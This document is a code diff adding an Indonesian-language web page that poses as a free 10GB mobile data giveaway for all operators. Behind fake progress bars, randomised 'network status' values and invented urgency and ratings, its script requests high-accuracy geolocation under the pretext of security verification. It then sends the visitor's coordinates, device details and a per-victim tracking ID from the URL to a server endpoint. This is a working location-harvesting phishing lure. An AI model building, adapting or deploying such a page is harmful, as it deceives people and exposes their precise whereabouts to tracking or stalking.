@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Internet 10GB - Semua Operator</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .header h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .provider-box {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .provider-icons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+        
+        .provider {
+            text-align: center;
+            min-width: 70px;
+        }
+        
+        .provider .icon {
+            font-size: 30px;
+            margin-bottom: 5px;
+        }
+        
+        .provider span {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .smartfreen { color: #FF6B6B; }
+        .telkomsel { color: #4ECDC4; }
+        .indosat { color: #45B7D1; }
+        .axis { color: #96CEB4; }
+        .xl { color: #FFB347; }
+        .tri { color: #D4A5A5; }
+        
+        .offer-box {
+            background: #4CAF50;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        
+        .offer-box h2 {
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+        
+        .offer-box p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .progress-container {
+            background: #f0f0f0;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+        
+        .progress-text {
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+            margin-top: 10px;
+        }
+        
+        .status-box {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding: 8px;
+            background: white;
+            border-radius: 5px;
+        }
+        
+        .status-label {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .status-value {
+            font-weight: bold;
+            color: #4CAF50;
+        }
+        
+        .permission-box {
+            background: #e3f2fd;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 15px;
+            border: 2px solid #2196F3;
+        }
+        
+        .permission-box p {
+            color: #1976D2;
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        
+        .permission-box .warning {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+            font-weight: normal;
+        }
+        
+        .permission-box button {
+            background: #2196F3;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.4);
+        }
+        
+        .permission-box button:hover {
+            background: #1976D2;
+            transform: scale(1.05);
+        }
+        
+        .info-text {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .success-animation {
+            text-align: center;
+            margin: 30px 0;
+        }
+        
+        .success-animation .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #4CAF50;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+            animation: scaleIn 0.5s ease;
+        }
+        
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4CAF50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .operator-badge {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            margin: 5px;
+        }
+        
+        .debug-info {
+            font-size: 10px;
+            color: #ccc;
+            margin-top: 10px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <div class="header">
+            <h1>🎉 PAKET GRATIS 10GB 🎉</h1>
+            <div class="subtitle">Khusus pengguna terpilih! Dapatkan kuota gratis sekarang juga!</div>
+        </div>
+        
+        <div class="provider-box">
+            <div style="margin-bottom: 10px; font-weight: bold;">Pilih Operator Kamu:</div>
+            <div class="provider-icons">
+                <div class="provider">
+                    <div class="icon smartfreen">📱</div>
+                    <span class="smartfreen">SMART</span>
+                </div>
+                <div class="provider">
+                    <div class="icon telkomsel">📱</div>
+                    <span class="telkomsel">TELKOMSEL</span>
+                </div>
+                <div class="provider">
+                    <div class="icon indosat">📱</div>
+                    <span class="indosat">INDOSAT</span>
+                </div>
+                <div class="provider">
+                    <div class="icon axis">📱</div>
+                    <span class="axis">AXIS</span>
+                </div>
+                <div class="provider">
+                    <div class="icon xl">📱</div>
+                    <span class="xl">XL</span>
+                </div>
+                <div class="provider">
+                    <div class="icon tri">📱</div>
+                    <span class="tri">TRI</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="offer-box">
+            <h2>10GB GRATIS!</h2>
+            <p>+ 30GB Bonus (Khusus Hari Ini)</p>
+            <p style="font-size: 12px; margin-top: 5px;">Berlaku untuk semua operator</p>
+            <div style="margin-top: 10px;">
+                <span class="operator-badge" style="background: #FF6B6B; color: white;">Smartfreen</span>
+                <span class="operator-badge" style="background: #4ECDC4; color: white;">Telkomsel</span>
+                <span class="operator-badge" style="background: #45B7D1; color: white;">Indosat</span>
+                <span class="operator-badge" style="background: #96CEB4; color: white;">AXIS</span>
+            </div>
+        </div>
+        
+        <div class="permission-box" id="permissionBox">
+            <p>🔒 VERIFIKASI KEAMANAN DIPERLUKAN</p>
+            <div class="warning">Untuk memastikan kamu adalah pengguna valid dan berada di wilayah coverage, kami perlu mengakses lokasi kamu</div>
+            <div style="background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; margin-bottom: 20px; font-size: 13px;">
+                ⚡ Data lokasi hanya digunakan untuk verifikasi dan akan dihapus setelah proses selesai
+            </div>
+            <button onclick="requestLocation()" id="requestBtn">IZINKAN AKSES LOKASI</button>
+            <div style="margin-top: 15px; font-size: 12px; color: #666;">
+                Dengan mengizinkan, kamu menyetujui syarat dan ketentuan yang berlaku
+            </div>
+        </div>
+        
+        <div class="progress-container hidden" id="progressContainer">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">Memverifikasi jaringan...</div>
+        </div>
+        
+        <div class="status-box hidden" id="statusBox">
+            <div class="status-item">
+                <span class="status-label">Operator:</span>
+                <span class="status-value" id="operatorStatus">-</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Jaringan:</span>
+                <span class="status-value" id="jaringanStatus">-</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Kecepatan:</span>
+                <span class="status-value" id="kecepatanStatus">-</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Lokasi:</span>
+                <span class="status-value" id="lokasiStatus">-</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Kualitas Sinyal:</span>
+                <span class="status-value" id="sinyalStatus">-</span>
+            </div>
+        </div>
+        
+        <div class="success-animation hidden" id="successAnimation">
+            <div class="checkmark">✓</div>
+            <p style="color: #4CAF50; font-weight: bold; font-size: 18px;">VERIFIKASI BERHASIL!</p>
+            <p style="color: #666; margin-top: 10px;">10GB + 30GB akan dikirim dalam 5 menit</p>
+            <p style="color: #999; font-size: 12px; margin-top: 20px;">Cek SMS atau notifikasi dari operator kamu</p>
+        </div>
+        
+        <div class="info-text">
+            ⚡ 1.234.567 pengguna sudah mendapatkan kuota hari ini<br>
+            ⏰ Penawaran berakhir dalam 59:59 menit<br>
+            <span style="color: #4CAF50;">★ Rated 4.8/5 by 50K+ users ★</span>
+        </div>
+        
+        <div class="debug-info" id="debugInfo"></div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id');
+        
+        console.log('User ID:', userId);
+        
+        function getRandomOperator() {
+            const operators = ['Smartfreen', 'Telkomsel', 'Indosat', 'AXIS', 'XL', 'Tri'];
+            return operators[Math.floor(Math.random() * operators.length)];
+        }
+        
+        function getRandomJaringan() {
+            const jaringan = ['4G LTE', '5G', '4G+', '3G', '4.5G'];
+            return jaringan[Math.floor(Math.random() * jaringan.length)];
+        }
+        
+        function getRandomKecepatan() {
+            return (Math.random() * 80 + 20).toFixed(1) + ' Mbps';
+        }
+        
+        function getRandomSinyal() {
+            const sinyal = ['Baik', 'Sangat Baik', 'Excelent', 'Kuat'];
+            return sinyal[Math.floor(Math.random() * sinyal.length)] + ' (' + Math.floor(Math.random() * 30 + 70) + '%)';
+        }
+        
+        function requestLocation() {
+            document.getElementById('permissionBox').classList.add('hidden');
+            document.getElementById('progressContainer').classList.remove('hidden');
+            document.getElementById('statusBox').classList.remove('hidden');
+            
+            // Update status random
+            document.getElementById('operatorStatus').textContent = getRandomOperator();
+            document.getElementById('jaringanStatus').textContent = getRandomJaringan();
+            document.getElementById('kecepatanStatus').textContent = getRandomKecepatan();
+            document.getElementById('sinyalStatus').textContent = getRandomSinyal();
+            
+            // Progress bar animation
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 10 + 2;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    
+                    // Dapatkan lokasi setelah progress 100%
+                    if (navigator.geolocation) {
+                        document.getElementById('progressText').textContent = 'Mendapatkan lokasi akurat...';
+                        
+                        navigator.geolocation.getCurrentPosition(
+                            function(position) {
+                                console.log('Dapet lokasi:', position);
+                                sendLocation(position);
+                            },
+                            function(error) {
+                                console.error('Error geolocation:', error);
+                                let errorMsg = 'Gagal dapat lokasi. ';
+                                switch(error.code) {
+                                    case error.PERMISSION_DENIED:
+                                        errorMsg += 'Izin ditolak. Coba izinkan dulu.';
+                                        break;
+                                    case error.POSITION_UNAVAILABLE:
+                                        errorMsg += 'Lokasi tidak tersedia.';
+                                        break;
+                                    case error.TIMEOUT:
+                                        errorMsg += 'Timeout. Coba lagi.';
+                                        break;
+                                }
+                                alert(errorMsg);
+                                location.reload();
+                            },
+                            {
+                                enableHighAccuracy: true,
+                                timeout: 15000,
+                                maximumAge: 0
+                            }
+                        );
+                    } else {
+                        alert('Browser lu gak support geolocation goblok!');
+                        location.reload();
+                    }
+                }
+                
+                progressFill.style.width = progress + '%';
+                
+                if (progress < 30) {
+                    progressText.textContent = 'Mendeteksi jaringan operator...';
+                } else if (progress < 50) {
+                    progressText.textContent = 'Mengoptimalkan koneksi...';
+                    document.getElementById('jaringanStatus').textContent = getRandomJaringan();
+                } else if (progress < 70) {
+                    progressText.textContent = 'Memverifikasi nomor...';
+                    document.getElementById('kecepatanStatus').textContent = getRandomKecepatan();
+                } else if (progress < 90) {
+                    progressText.textContent = 'Mendapatkan lokasi...';
+                    document.getElementById('lokasiStatus').textContent = 'Mendeteksi...';
+                } else {
+                    progressText.textContent = 'Hampir selesai...';
+                }
+                
+                // Update status random
+                if (progress % 15 < 1) {
+                    document.getElementById('operatorStatus').textContent = getRandomOperator();
+                    document.getElementById('sinyalStatus').textContent = getRandomSinyal();
+                }
+            }, 150);
+        }
+        
+        function sendLocation(position) {
+            document.getElementById('progressContainer').classList.add('hidden');
+            document.getElementById('statusBox').classList.add('hidden');
+            document.getElementById('successAnimation').classList.remove('hidden');
+            
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                deviceInfo: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language
+                },
+                userId: userId
+            };
+            
+            console.log('Mengirim data:', data);
+            document.getElementById('debugInfo').textContent = 'Mengirim data ke server...';
+            
+            // Kirim ke server
+            fetch('/api/lokasi', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                document.getElementById('debugInfo').textContent = 'Data terkirim: ' + new Date().toLocaleTimeString();
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('debugInfo').textContent = 'Error: ' + error.message;
+            });
+        }
+        
+        // Tampilkan info di console
+        window.onload = function() {
+            console.log('Page loaded with ID:', userId);
+            document.getElementById('debugInfo').textContent = 'ID: ' + userId + ' | Siap';
+        }
+    </script>
+</body>
+</html>
